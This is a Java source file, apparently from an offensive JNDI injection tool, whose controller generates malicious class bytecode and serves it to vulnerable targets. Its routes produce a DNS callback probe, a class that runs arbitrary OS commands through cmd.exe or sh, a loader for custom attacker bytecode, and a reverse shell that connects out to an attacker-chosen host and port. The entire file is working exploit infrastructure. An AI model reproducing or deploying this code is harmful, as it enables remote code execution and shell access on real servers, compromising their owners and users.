package com.h2tg.ysogate.controller;

import com.h2tg.ysogate.config.JndiConfig;
import com.h2tg.ysogate.utils.RandomUtils;
import javassist.*;
import javassist.bytecode.AccessFlag;
import javassist.bytecode.ClassFile;
import com.h2tg.ysogate.annotation.JNDIController;
import com.h2tg.ysogate.annotation.JNDIMapping;
import com.h2tg.ysogate.exploit.server.WebServer;
import com.template.ReverseShellTemplate;
import com.h2tg.ysogate.utils.CtClassUtils;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.IOException;
import static com.h2tg.ysogate.utils.MiscUtils.parseCustomData;

@JNDIController
@JNDIMapping("/Basic")
public class BasicController implements Controller {
    @Override
    public Object process(Object obj) {
        byte[] byteCode = (byte[]) obj;
        System.out.println("[Reference] Remote codebase: " + JndiConfig.codebase);

        String className;

        try {
            ClassFile classFile = new ClassFile(new DataInputStream(new ByteArrayInputStream(byteCode)));
            className = classFile.getName();
        } catch (Exception e) {
            return null;
        }

        WebServer.getInstance().serveFile("/" + className.replace('.', '/') + ".class", byteCode);
        return className;
    }

    @JNDIMapping("/DNSLog/{url}")
    public byte[] dnsLog(String url) throws Exception {
        System.out.println("[DnsLog] Url:" + url);

        if (!url.startsWith("http://")) {
            url = "http://" + url;
        }

        String className = RandomUtils.getRandStr(12);
        ClassPool pool = ClassPool.getDefault();
        ClassFile classFile = new ClassFile(false, className, null);
        classFile.setMajorVersion(ClassFile.JAVA_8);
        classFile.setAccessFlags(AccessFlag.PUBLIC);
        CtClass clazz = pool.makeClass(classFile);

        String body = String.format("new java.net.URL(\"%s\").hashCode();", url);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setModifiers(Modifier.PUBLIC);
        constructor.setBody(body);
        clazz.addConstructor(constructor);
        return clazz.toBytecode();
    }

    @JNDIMapping("/Command/{cmd}")
    public byte[] command(String cmd) throws Exception {
        System.out.println("[Command] Cmd: " + cmd);

        String className = RandomUtils.getRandStr(12);
        ClassPool pool = ClassPool.getDefault();
        ClassFile classFile = new ClassFile(false, className, null);
        classFile.setMajorVersion(ClassFile.JAVA_8);
        classFile.setAccessFlags(AccessFlag.PUBLIC);
        CtClass clazz = pool.makeClass(classFile);

        String body = "java.lang.Runtime.getRuntime().exec(System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\", \"/c\", \"COMMAND\"} : new String[]{\"sh\", \"-c\", \"COMMAND\"});"
                .replace("COMMAND", cmd);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setModifiers(Modifier.PUBLIC);
        constructor.setBody(body);
        clazz.addConstructor(constructor);
        return clazz.toBytecode();
    }

    @JNDIMapping("/Custom/{data}")
    public byte[] custom(String data) throws IOException
    {
        System.out.println("[Code] Load custom bytecode data");
        byte[] byteCode;
        try {
            byteCode = parseCustomData(data);
        } catch (Exception e) {
            System.out.println("[Error] Failed to parse custom data");
            return null;
        }

        return byteCode;
    }


    @JNDIMapping("/ReverseShell/{host}/{port}")
    public byte[] reverseShell(String host, String port) throws Exception {
        System.out.println("[ReverseShell]: Host: " + host + " Port: " + port);

        String className = RandomUtils.getRandStr(12);
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(ReverseShellTemplate.class.getName());
        clazz.replaceClassName(clazz.getName(), className);

        CtClassUtils.setCtField(clazz, "host", CtField.Initializer.constant(host));
        CtClassUtils.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));

        return clazz.toBytecode();
    }
}
